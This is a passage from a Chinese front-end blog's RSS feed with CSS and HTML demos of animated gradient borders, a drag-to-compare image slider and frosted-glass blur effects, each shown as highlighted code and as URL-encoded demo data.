  <span>border-image</span><span>:</span> <span>linear-gradient</span><span>(</span>45deg<span>,</span> gold<span>,</span> deeppink<span>)</span> 1<span>;</span>
  <span>clip-path</span><span>:</span> <span>inset</span><span>(</span>0 round 10px<span>)</span><span>;</span>
  <span>animation</span><span>:</span> hue-rotate 3s infinite linear<span>;</span>
  <span>filter</span><span>:</span> <span>hue-rotate</span><span>(</span>360deg<span>)</span><span>;</span>
<span>}</span>

<span><span>@keyframes</span> hue-rotate</span> <span>{</span>
  <span>0%</span> <span>{</span>
    <span>filter</span><span>:</span> <span>hue-rotate</span><span>(</span>0deg<span>)</span><span>;</span>
  <span>}</span>
  <span>100%</span> <span>{</span>
    <span>filter</span><span>:</span> <span>hue-rotate</span><span>(</span>360deg<span>)</span><span>;</span>
  <span>}</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br></div></div>
            </div>
          </div>
          
        </div>

          <div
            id="code-demo-5cd6a8f5"
           
  
 

            data-code="%7B%22html%22%3A%22%3Cmain%3E%5Cn%20%20%3Csection%3E%3C%2Fsection%3E%5Cn%3C%2Fmain%3E%5Cn%22%2C%22css%22%3A%22main%20%7B%5Cn%20%20height%3A%20400px%3B%5Cn%20%20display%3A%20grid%3B%5Cn%20%20place-items%3A%20center%3B%5Cn%20%20background%3A%20%23000%3B%5Cn%7D%5Cn%5Cnsection%20%7B%5Cn%20%20position%3A%20relative%3B%5Cn%20%20z-index%3A%200%3B%5Cn%20%20width%3A%2050%25%3B%5Cn%20%20height%3A%2050%25%3B%5Cn%20%20border-radius%3A%2010px%3B%5Cn%20%20overflow%3A%20hidden%3B%5Cn%20%20background%3A%20rgba(168%2C%20239%2C%20255%2C%200.1)%3B%5Cn%7D%5Cn%5Cnsection%3A%3Abefore%20%7B%5Cn%20%20content%3A%20'%20'%3B%5Cn%20%20position%3A%20absolute%3B%5Cn%20%20z-index%3A%20-2%3B%5Cn%20%20left%3A%20-50%25%3B%5Cn%20%20top%3A%20-50%25%3B%5Cn%20%20width%3A%20200%25%3B%5Cn%20%20height%3A%20200%25%3B%5Cn%20%20background%3A%20conic-gradient(%5Cn%20%20%20%20transparent%2C%5Cn%20%20%20%20rgba(168%2C%20239%2C%20255%2C%201)%2C%5Cn%20%20%20%20transparent%2030%25%5Cn%20%20)%3B%5Cn%20%20animation%3A%20rotate%203s%20linear%20infinite%3B%5Cn%7D%5Cn%5Cnsection%3A%3Aafter%20%7B%5Cn%20%20content%3A%20'%20'%3B%5Cn%20%20position%3A%20absolute%3B%5Cn%20%20z-index%3A%20-1%3B%5Cn%20%20left%3A%206px%3B%5Cn%20%20top%3A%206px%3B%5Cn%20%20width%3A%20calc(100%25%20-%2012px)%3B%5Cn%20%20height%3A%20calc(100%25%20-%2012px)%3B%5Cn%20%20background%3A%20%23000%3B%5Cn%20%20border-radius%3A%205px%3B%5Cn%7D%5Cn%5Cn%40keyframes%20rotate%20%7B%5Cn%20%20100%25%20%7B%5Cn%20%20%20%20transform%3A%20rotate(1turn)%3B%5Cn%20%20%7D%5Cn%7D%5Cn%22%7D"
          >
              
              <div>
                <div>
<div><pre><code><span><span><span>&lt;</span>main</span><span>></span></span>
  <span><span><span>&lt;</span>section</span><span>></span></span><span><span><span>&lt;/</span>section</span><span>></span></span>
<span><span><span>&lt;/</span>main</span><span>></span></span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div><div><pre><code><span>main</span> <span>{</span>
  <span>height</span><span>:</span> 400px<span>;</span>
  <span>display</span><span>:</span> grid<span>;</span>
  <span>place-items</span><span>:</span> center<span>;</span>
  <span>background</span><span>:</span> #000<span>;</span>
<span>}</span>

<span>section</span> <span>{</span>
  <span>position</span><span>:</span> relative<span>;</span>
  <span>z-index</span><span>:</span> 0<span>;</span>
  <span>width</span><span>:</span> 50%<span>;</span>
  <span>height</span><span>:</span> 50%<span>;</span>
  <span>border-radius</span><span>:</span> 10px<span>;</span>
  <span>overflow</span><span>:</span> hidden<span>;</span>
  <span>background</span><span>:</span> <span>rgba</span><span>(</span>168<span>,</span> 239<span>,</span> 255<span>,</span> 0.1<span>)</span><span>;</span>
<span>}</span>

<span>section::before</span> <span>{</span>
  <span>content</span><span>:</span> <span>' '</span><span>;</span>
  <span>position</span><span>:</span> absolute<span>;</span>
  <span>z-index</span><span>:</span> -2<span>;</span>
  <span>left</span><span>:</span> -50%<span>;</span>
  <span>top</span><span>:</span> -50%<span>;</span>
  <span>width</span><span>:</span> 200%<span>;</span>
  <span>height</span><span>:</span> 200%<span>;</span>
  <span>background</span><span>:</span> <span>conic-gradient</span><span>(</span>
    transparent<span>,</span>
    <span>rgba</span><span>(</span>168<span>,</span> 239<span>,</span> 255<span>,</span> 1<span>)</span><span>,</span>
    transparent 30%
  <span>)</span><span>;</span>
  <span>animation</span><span>:</span> rotate 3s linear infinite<span>;</span>
<span>}</span>

<span>section::after</span> <span>{</span>
  <span>content</span><span>:</span> <span>' '</span><span>;</span>
  <span>position</span><span>:</span> absolute<span>;</span>
  <span>z-index</span><span>:</span> -1<span>;</span>
  <span>left</span><span>:</span> 6px<span>;</span>
  <span>top</span><span>:</span> 6px<span>;</span>
  <span>width</span><span>:</span> <span>calc</span><span>(</span>100% - 12px<span>)</span><span>;</span>
  <span>height</span><span>:</span> <span>calc</span><span>(</span>100% - 12px<span>)</span><span>;</span>
  <span>background</span><span>:</span> #000<span>;</span>
  <span>border-radius</span><span>:</span> 5px<span>;</span>
<span>}</span>

<span><span>@keyframes</span> rotate</span> <span>{</span>
  <span>100%</span> <span>{</span>
    <span>transform</span><span>:</span> <span>rotate</span><span>(</span>1turn<span>)</span><span>;</span>
  <span>}</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br></div></div>
            </div>
          </div>
          
        </div>
]]></content:encoded>
    </item>
    <item>
      <title>拖拽切换</title>
      <link>https://www.matrixtheone.ga/web/magic/Drag-Switch/</link>
      <guid>https://www.matrixtheone.ga/web/magic/Drag-Switch/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">拖拽切换</source>
      <category>CSS</category>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[
          <div
            id="code-demo-305bf33d"
           
  
 data-title=""

            data-code="%7B%22html%22%3A%22%3Cmain%3E%5Cn%20%20%3Csection%3E%5Cn%20%20%20%20%3Cdiv%20class%3D%5C%22resize%5C%22%3E%3C%2Fdiv%3E%5Cn%20%20%3C%2Fsection%3E%5Cn%3C%2Fmain%3E%5Cn%22%2C%22css%22%3A%22main%20%7B%5Cn%20%20position%3A%20relative%3B%5Cn%20%20width%3A%20100%25%3B%5Cn%20%20height%3A%20400px%3B%5Cn%20%20overflow%3A%20hidden%3B%5Cn%20%20background%3A%20url(..%2F..%2Fimages%2FWives%2FBingBing-6.webp)%200%2020%25%2F942px%20522px%5Cn%20%20%20%20no-repeat%3B%5Cn%7D%5Cn%5Cnsection%20%7B%5Cn%20%20position%3A%20absolute%3B%5Cn%20%20top%3A%200%3B%5Cn%20%20left%3A%200%3B%5Cn%20%20height%3A%20100%25%3B%5Cn%20%20min-width%3A%200%3B%5Cn%20%20max-width%3A%20100%25%3B%5Cn%20%20background%3A%20url(..%2F..%2Fimages%2FCover%2FNational-Flag.png)%200%200%2F716px%20478px%5Cn%20%20%20%20no-repeat%3B%5Cn%20%20-webkit-mask%3A%20linear-gradient(110deg%2C%20%23000%2010%25%2C%20transparent%2070%25%2C%20transparent)%3B%5Cn%7D%5Cn%5Cnsection%3A%3Abefore%20%7B%5Cn%20%20content%3A%20'%E2%86%94'%3B%5Cn%20%20display%3A%20flex%3B%5Cn%20%20align-items%3A%20center%3B%5Cn%20%20justify-content%3A%20center%3B%5Cn%20%20position%3A%20absolute%3B%5Cn%20%20top%3A%200%3B%5Cn%20%20right%3A%200%3B%5Cn%20%20width%3A%2015px%3B%5Cn%20%20height%3A%20100%25%3B%5Cn%20%20color%3A%20%23ffb8c4ff%3B%5Cn%20%20background%3A%20rgba(0%2C%200%2C%200%2C%200.5)%3B%5Cn%7D%5Cn%5Cn.resize%20%7B%5Cn%20%20position%3A%20relative%3B%5Cn%20%20opacity%3A%200%3B%5Cn%20%20top%3A%2050%25%3B%5Cn%20%20left%3A%200%3B%5Cn%20%20width%3A%200%3B%5Cn%20%20height%3A%2015px%3B%5Cn%20%20min-width%3A%2015px%3B%5Cn%20%20max-width%3A%20100%25%3B%5Cn%20%20resize%3A%20horizontal%3B%5Cn%20%20overflow%3A%20scroll%3B%5Cn%20%20transform%3A%20scaleY(100)%3B%5Cn%20%20transform-origin%3A%20center%3B%5Cn%7D%5Cn%22%7D"
          >
              
              <div>
                <div>
<div><pre><code><span><span><span>&lt;</span>main</span><span>></span></span>
  <span><span><span>&lt;</span>section</span><span>></span></span>
    <span><span><span>&lt;</span>div</span> <span>class</span><span><span>=</span><span>"</span>resize<span>"</span></span><span>></span></span><span><span><span>&lt;/</span>div</span><span>></span></span>
  <span><span><span>&lt;/</span>section</span><span>></span></span>
<span><span><span>&lt;/</span>main</span><span>></span></span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br></div></div><div><pre><code><span>main</span> <span>{</span>
  <span>position</span><span>:</span> relative<span>;</span>
  <span>width</span><span>:</span> 100%<span>;</span>
  <span>height</span><span>:</span> 400px<span>;</span>
  <span>overflow</span><span>:</span> hidden<span>;</span>
  <span>background</span><span>:</span> <span><span>url</span><span>(</span>../../images/Wives/BingBing-6.webp<span>)</span></span> 0 20%/942px 522px
    no-repeat<span>;</span>
<span>}</span>

<span>section</span> <span>{</span>
  <span>position</span><span>:</span> absolute<span>;</span>
  <span>top</span><span>:</span> 0<span>;</span>
  <span>left</span><span>:</span> 0<span>;</span>
  <span>height</span><span>:</span> 100%<span>;</span>
  <span>min-width</span><span>:</span> 0<span>;</span>
  <span>max-width</span><span>:</span> 100%<span>;</span>
  <span>background</span><span>:</span> <span><span>url</span><span>(</span>../../images/Cover/National-Flag.png<span>)</span></span> 0 0/716px 478px
    no-repeat<span>;</span>
  <span>-webkit-mask</span><span>:</span> <span>linear-gradient</span><span>(</span>110deg<span>,</span> #000 10%<span>,</span> transparent 70%<span>,</span> transparent<span>)</span><span>;</span>
<span>}</span>

<span>section::before</span> <span>{</span>
  <span>content</span><span>:</span> <span>'↔'</span><span>;</span>
  <span>display</span><span>:</span> flex<span>;</span>
  <span>align-items</span><span>:</span> center<span>;</span>
  <span>justify-content</span><span>:</span> center<span>;</span>
  <span>position</span><span>:</span> absolute<span>;</span>
  <span>top</span><span>:</span> 0<span>;</span>
  <span>right</span><span>:</span> 0<span>;</span>
  <span>width</span><span>:</span> 15px<span>;</span>
  <span>height</span><span>:</span> 100%<span>;</span>
  <span>color</span><span>:</span> #ffb8c4ff<span>;</span>
  <span>background</span><span>:</span> <span>rgba</span><span>(</span>0<span>,</span> 0<span>,</span> 0<span>,</span> 0.5<span>)</span><span>;</span>
<span>}</span>

<span>.resize</span> <span>{</span>
  <span>position</span><span>:</span> relative<span>;</span>
  <span>opacity</span><span>:</span> 0<span>;</span>
  <span>top</span><span>:</span> 50%<span>;</span>
  <span>left</span><span>:</span> 0<span>;</span>
  <span>width</span><span>:</span> 0<span>;</span>
  <span>height</span><span>:</span> 15px<span>;</span>
  <span>min-width</span><span>:</span> 15px<span>;</span>
  <span>max-width</span><span>:</span> 100%<span>;</span>
  <span>resize</span><span>:</span> horizontal<span>;</span>
  <span>overflow</span><span>:</span> scroll<span>;</span>
  <span>transform</span><span>:</span> <span>scaleY</span><span>(</span>100<span>)</span><span>;</span>
  <span>transform-origin</span><span>:</span> center<span>;</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br></div></div>
            </div>
          </div>
          
        </div>
]]></content:encoded>
    </item>
    <item>
      <title>毛玻璃</title>
      <link>https://www.matrixtheone.ga/web/magic/Ground-Glass/</link>
      <guid>https://www.matrixtheone.ga/web/magic/Ground-Glass/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">毛玻璃</source>
      <category>CSS</category>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[<h3 id="backdrop-filter-blur"> backdrop-filter: blur()</h3>
<blockquote>
<p>透明度 + 模糊，火狐默认无效，移动端兼容性不大友好</p>
</blockquote>

          <div
            id="code-demo-79852cd9"
           
  
 data-title=""

            data-code="%7B%22html%22%3A%22%3Cmain%3E%5Cn%20%20%3Csection%3E%5Cn%20%20%20%20%3Cspan%3E%E5%89%8D%E5%A4%A9%E7%9C%8B%E5%88%B0%E4%BA%86%E5%B0%8F%E5%85%94%E5%AD%90%3C%2Fspan%3E%5Cn%20%20%20%20%3Cspan%3E%E6%98%A8%E5%A4%A9%E6%98%AF%E5%B0%8F%E9%B9%BF%3C%2Fspan%3E%5Cn%20%20%20%20%3Cspan%3E%E4%BB%8A%E5%A4%A9%E6%98%AF%E4%BD%A0%3C%2Fspan%3E%5Cn%20%20%3C%2Fsection%3E%5Cn%3C%2Fmain%3E%5Cn%22%2C%22css%22%3A%22main%20%7B%5Cn%20%20height%3A%20400px%3B%5Cn%20%20background%3A%20url(..%2F..%2Fimages%2FWives%2FBingBing-1.webp)%20center%2Fcover%20no-repeat%3B%5Cn%7D%5Cn%5Cnsection%20%7B%5Cn%20%20position%3A%20absolute%3B%5Cn%20%20width%3A%20400px%3B%5Cn%20%20height%3A%20300px%3B%5Cn%20%20left%3A%2050%25%3B%5Cn%20%20top%3A%2050%25%3B%5Cn%20%20transform%3A%20translate(-50%25%2C%20-50%25)%3B%5Cn%20%20background%3A%20hsla(0%2C%200%25%2C%20100%25%2C%200.3)%3B%20%2F*%20%E9%80%8F%E6%98%8E%E5%BA%A6%20*%2F%5Cn%20%20border-radius%3A%2012px%3B%5Cn%20%20overflow%3A%20hidden%3B%5Cn%5Cn%20%20box-sizing%3A%20border-box%3B%5Cn%20%20padding%3A%2040px%3B%5Cn%20%20display%3A%20grid%3B%5Cn%20%20place-items%3A%20center%20start%3B%5Cn%20%20font-size%3A%2018px%3B%5Cn%20%20color%3A%20%23ffb8c4ff%3B%5Cn%20%20writing-mode%3A%20vertical-rl%3B%5Cn%20%20letter-spacing%3A%208px%3B%5Cn%20%20user-select%3A%20none%3B%5Cn%7D%5Cn%5Cnsection%3A%3Abefore%20%7B%5Cn%20%20content%3A%20'%20'%3B%5Cn%20%20position%3A%20absolute%3B%5Cn%20%20z-index%3A%20-1%3B%5Cn%20%20top%3A%200%3B%5Cn%20%20right%3A%200%3B%5Cn%20%20bottom%3A%200%3B%5Cn%20%20left%3A%200%3B%5Cn%20%20backdrop-filter%3A%20blur(5px)%3B%20%2F*%20%E8%83%8C%E5%90%8E%E5%85%83%E7%B4%A0%E6%A8%A1%E7%B3%8A%20*%2F%5Cn%7D%5Cn%22%7D"
          >
              
              <div>
                <div>
<div><pre><code><span><span><span>&lt;</span>main</span><span>></span></span>
  <span><span><span>&lt;</span>section</span><span>></span></span>
    <span><span><span>&lt;</span>span</span><span>></span></span>前天看到了小兔子<span><span><span>&lt;/</span>span</span><span>></span></span>
    <span><span><span>&lt;</span>span</span><span>></span></span>昨天是小鹿<span><span><span>&lt;/</span>span</span><span>></span></span>
    <span><span><span>&lt;</span>span</span><span>></span></span>今天是你<span><span><span>&lt;/</span>span</span><span>></span></span>
  <span><span><span>&lt;/</span>section</span><span>></span></span>
<span><span><span>&lt;/</span>main</span><span>></span></span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br></div></div><div><pre><code><span>main</span> <span>{</span>
  <span>height</span><span>:</span> 400px<span>;</span>
  <span>background</span><span>:</span> <span><span>url</span><span>(</span>../../images/Wives/BingBing-1.webp<span>)</span></span> center/cover no-repeat<span>;</span>
<span>}</span>

<span>section</span> <span>{</span>
  <span>position</span><span>:</span> absolute<span>;</span>
  <span>width</span><span>:</span> 400px<span>;</span>
  <span>height</span><span>:</span> 300px<span>;</span>
  <span>left</span><span>:</span> 50%<span>;</span>
  <span>top</span><span>:</span> 50%<span>;</span>
  <span>transform</span><span>:</span> <span>translate</span><span>(</span>-50%<span>,</span> -50%<span>)</span><span>;</span>
  <span>background</span><span>:</span> <span>hsla</span><span>(</span>0<span>,</span> 0%<span>,</span> 100%<span>,</span> 0.3<span>)</span><span>;</span> <span>/* 透明度 */</span>
  <span>border-radius</span><span>:</span> 12px<span>;</span>
  <span>overflow</span><span>:</span> hidden<span>;</span>

  <span>box-sizing</span><span>:</span> border-box<span>;</span>
  <span>padding</span><span>:</span> 40px<span>;</span>
  <span>display</span><span>:</span> grid<span>;</span>
  <span>place-items</span><span>:</span> center start<span>;</span>
  <span>font-size</span><span>:</span> 18px<span>;</span>
  <span>color</span><span>:</span> #ffb8c4ff<span>;</span>
  <span>writing-mode</span><span>:</span> vertical-rl<span>;</span>
  <span>letter-spacing</span><span>:</span> 8px<span>;</span>
  <span>user-select</span><span>:</span> none<span>;</span>
<span>}</span>

<span>section::before</span> <span>{</span>
  <span>content</span><span>:</span> <span>' '</span><span>;</span>
  <span>position</span><span>:</span> absolute<span>;</span>
  <span>z-index</span><span>:</span> -1<span>;</span>
  <span>top</span><span>:</span> 0<span>;</span>
  <span>right</span><span>:</span> 0<span>;</span>
  <span>bottom</span><span>:</span> 0<span>;</span>
  <span>left</span><span>:</span> 0<span>;</span>
  <span>backdrop-filter</span><span>:</span> <span>blur</span><span>(</span>5px<span>)</span><span>;</span> <span>/* 背后元素模糊 */</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br></div></div>
            </div>
          </div>
          
        </div>
<h3 id="background-attachment-fixed-filter-blur"> background-attachment: fixed + filter: blur()</h3>
<blockquote>
<p>背景叠加 + 模糊</p>
</blockquote>

          <div
            id="code-demo-e0f5c2ce"
           
  
 data-title=""

            data-code="%7B%22html%22%3A%22%3Cmain%3E%5Cn%20%20%3Csection%3E%5Cn%20%20%20%20%3Cspan%3E%E5%89%8D%E5%A4%A9%E7%9C%8B%E5%88%B0%E4%BA%86%E5%B0%8F%E5%85%94%E5%AD%90%3C%2Fspan%3E%5Cn%20%20%20%20%3Cspan%3E%E6%98%A8%E5%A4%A9%E6%98%AF%E5%B0%8F%E9%B9%BF%3C%2Fspan%3E%5Cn%20%20%20%20%3Cspan%3E%E4%BB%8A%E5%A4%A9%E6%98%AF%E4%BD%A0%3C%2Fspan%3E%5Cn%20%20%3C%2Fsection%3E%5Cn%3C%2Fmain%3E%5Cn%22%2C%22css%22%3A%22main%20%7B%5Cn%20%20height%3A%20400px%3B%5Cn%20%20background%3A%20url(..%2F..%2Fimages%2FWives%2FBingBing-1.webp)%20center%2Fcover%20fixed%5Cn%20%20%20%20no-repeat%3B%5Cn%20%20display%3A%20flex%3B%5Cn%20%20align-items%3A%20center%3B%5Cn%20%20justify-content%3A%20center%3B%5Cn%7D%5Cn%5Cnsection%20%7B%5Cn%20%20position%3A%20relative%3B%5Cn%20%20z-index%3A%201%3B%5Cn%20%20width%3A%20400px%3B%5Cn%20%20height%3A%20300px%3B%5Cn%20%20background%3A%20inherit%3B%20%2F*%20%E8%83%8C%E6%99%AF%E5%8F%A0%E5%8A%A0%20*%2F%5Cn%20%20border-radius%3A%2012px%3B%5Cn%20%20overflow%3A%20hidden%3B%5Cn%5Cn%20%20box-sizing%3A%20border-box%3B%5Cn%20%20padding%3A%2040px%3B%5Cn%20%20display%3A%20grid%3B%5Cn%20%20place-items%3A%20center%20start%3B%5Cn%20%20font-size%3A%2018px%3B%5Cn%20%20color%3A%20%23ffb8c4ff%3B%5Cn%20%20writing-mode%3A%20vertical-rl%3B%5Cn%20%20letter-spacing%3A%208px%3B%5Cn%20%20user-select%3A%20none%3B%5Cn%7D%5Cn%5Cnsection%3A%3Abefore%20%7B%5Cn%20%20content%3A%20'%20'%3B%5Cn%20%20position%3A%20absolute%3B%5Cn%20%20z-index%3A%20-1%3B%5Cn%20%20top%3A%200%3B%5Cn%20%20right%3A%200%3B%5Cn%20%20bottom%3A%200%3B%5Cn%20%20left%3A%200%3B%5Cn%20%20overflow%3A%20hidden%3B%5Cn%20%20background%3A%20inherit%3B%20%2F*%20%E8%83%8C%E6%99%AF%E5%8F%A0%E5%8A%A0%20*%2F%5Cn%20%20box-shadow%3A%20inset%200%200%200%20200px%20hsla(0%2C%200%25%2C%20100%25%2C%200.3)%3B%20%2F*%20%E8%92%99%E5%B1%82%20*%2F%5Cn%20%20filter%3A%20blur(7px)%3B%20%2F*%20%E8%87%AA%E8%BA%AB%E5%85%83%E7%B4%A0%E6%A8%A1%E7%B3%8A%20*%2F%5Cn%7D%5Cn%22%7D"
          >
              
              <div>
                <div>
<div><pre><code><span><span><span>&lt;</span>main</span><span>></span></span>
  <span><span><span>&lt;</span>section</span><span>></span></span>
    <span><span><span>&lt;</span>span</span><span>></span></span>前天看到了小兔子<span><span><span>&lt;/</span>span</span><span>></span></span>
    <span><span><span>&lt;</span>span</span><span>></span></span>昨天是小鹿<span><span><span>&lt;/</span>span</span><span>></span></span>
    <span><span><span>&lt;</span>span</span><span>></span></span>今天是你<span><span><span>&lt;/</span>span</span><span>></span></span>
  <span><span><span>&lt;/</span>section</span><span>></span></span>
<span><span><span>&lt;/</span>main</span><span>></span></span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br></div></div><div><pre><code><span>main</span> <span>{</span>
  <span>height</span><span>:</span> 400px<span>;</span>
  <span>background</span><span>:</span> <span><span>url</span><span>(</span>../../images/Wives/BingBing-1.webp<span>)</span></span> center/cover fixed
    no-repeat<span>;</span>
  <span>display</span><span>:</span> flex<span>;</span>
  <span>align-items</span><span>:</span> center<span>;</span>
  <span>justify-content</span><span>:</span> center<span>;</span>
<span>}</span>

<span>section</span> <span>{</span>
  <span>position</span><span>:</span> relative<span>;</span>
  <span>z-index</span><span>:</span> 1<span>;</span>
  <span>width</span><span>:</span> 400px<span>;</span>
  <span>height</span><span>:</span> 300px<span>;</span>
  <span>background</span><span>:</span> inherit<span>;</span> <span>/* 背景叠加 */</span>
  <span>border-radius</span><span>:</span> 12px<span>;</span>
  <span>overflow</span><span>:</span> hidden<span>;</span>

  <span>box-sizing</span><span>:</span> border-box<span>;</span>
  <span>padding</span><span>:</span> 40px<span>;</span>
  <span>display</span><span>:</span> grid<span>;</span>
  <span>place-items</span><span>:</span> center start<span>;</span>
  <span>font-size</span><span>:</span> 18px<span>;</span>
  <span>color</span><span>:</span> #ffb8c4ff<span>;</span>
  <span>writing-mode</span><span>:</span> vertical-rl<span>;</span>
  <span>letter-spacing</span><span>:</span> 8px<span>;</span>
  <span>user-select</span><span>:</span> none<span>;</span>
<span>}</span>

<span>section::before</span> <span>{</span>
  <span>content</span><span>:</span> <span>' '</span><span>;</span>
  <span>position</span><span>:</span> absolute<span>;</span>
  <span>z-index</span><span>:</span> -1<span>;</span>
  <span>top</span><span>:</span> 0<span>;</span>
  <span>right</span><span>:</span> 0<span>;</span>
  <span>bottom</span><span>:</span> 0<span>;</span>
  <span>left</span><span>:</span> 0<span>;</span>
  <span>overflow</span><span>:</span> hidden<span>;</span>
  <span>background</span><span>:</span> inherit<span>;</span> <span>/* 背景叠加 */</span>
  <span>box-shadow</span><span>:</span> inset 0 0 0 200px <span>hsla</span><span>(</span>0<span>,</span> 0%<span>,</span> 100%<span>,</span> 0.3<span>)</span><span>;</span> <span>/* 蒙层 */</span>
  <span>filter</span><span>:</span> <span>blur</span><span>(</span>7px<span>)</span><span>;</span> <span>/* 自身元素模糊 */</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br></div></div>
            </div>
          </div>
          
        </div>
<div><p>注意</p>
<p>奇怪！ background-attachment: fixed; 在此 Demo 中不生效，可恶！！！</p>
</div>
<h3 id="磨砂渐变背景"> 磨砂渐变背景</h3>

          <div
            id="code-demo-55200ab7"
           
  
 data-title=""

            data-code="%7B%22html%22%3A%22%3Cmain%3E%5Cn%20%20%3Cspan%3EMagic%3C%2Fspan%3E%5Cn%20%20%3Csection%3E%3C%2Fsection%3E%5Cn%20%20%3Csection%3E%3C%2Fsection%3E%5Cn%20%20%3Csection%3E%3C%2Fsection%3E%5Cn%3C%2Fmain%3E%5Cn%22%2C%22css%22%3A%22main%20%7B%5Cn%20%20height%3A%20400px%3B%5Cn%20%20overflow%3A%20hidden%3B%5Cn%20%20position%3A%20relative%3B%5Cn%7D%5Cn%5Cnmain%3A%3Abefore%20%7B%5Cn%20%20content%3A%20'%20'%3B%5Cn%20%20position%3A%20absolute%3B%5Cn%20%20top%3A%200%3B%5Cn%20%20left%3A%200%3B%5Cn%20%20bottom%3A%200%3B%5Cn%20%20right%3A%200%3B%5Cn%20%20backdrop-filter%3A%20blur(150px)%3B%5Cn%20%20z-index%3A%201%3B%5Cn%7D%5Cn%5Cnspan%20%7B%5Cn%20%20position%3A%20absolute%3B%5Cn%20%20top%3A%2050%25%3B%5Cn%20%20left%3A%2050%25%3B%5Cn%20%20transform%3A%20translate(-50%25%2C%20-50%25)%3B%5Cn%20%20z-index%3A%202%3B%5Cn%20%20font-size%3A%207em%3B%5Cn%20%20-webkit-background-clip%3A%20text%3B%5Cn%20%20-webkit-text-fill-color%3A%20transparent%3B%5Cn%20%20background-image%3A%20linear-gradient(90deg%2C%20%23f66%2C%20%23f90)%3B%5Cn%20%20animation%3A%20hue-rotate%205s%20linear%20infinite%3B%5Cn%7D%5Cn%5Cnsection%20%7B%5Cn%20%20position%3A%20absolute%3B%5Cn%20%20opacity%3A%200.7%3B%5Cn%7D%5Cn%5Cnsection%3Anth-child(1)%20%7B%5Cn%20%20left%3A%2050%25%3B%5Cn%20%20bottom%3A%2020%25%3B%5Cn%20%20width%3A%2080%25%3B%5Cn%20%20height%3A%2070%25%3B%5Cn%20%20transform%3A%20translateX(-50%25)%3B%5Cn%20%20background%3A%20linear-gradient(%23ffee55%2C%20%23fdee99)%3B%5Cn%20%20clip-path%3A%20polygon(0%2010%25%2C%2030%25%200%2C%20100%25%2040%25%2C%2070%25%20100%25%2C%2020%25%2090%25)%3B%5Cn%20%20animation%3A%20hue-rotate%205s%20linear%20infinite%3B%5Cn%7D%5Cn%5Cnsection%3Anth-child(2)%20%7B%5Cn%20%20left%3A%2030%25%3B%5Cn%20%20bottom%3A%200%3B%5Cn%20%20width%3A%2090%25%3B%5Cn%20%20height%3A%2070%25%3B%5Cn%20%20transform%3A%20translateX(-50%25)%3B%5Cn%20%20background%3A%20linear-gradient(%23e950d1%2C%20%23f980d9)%3B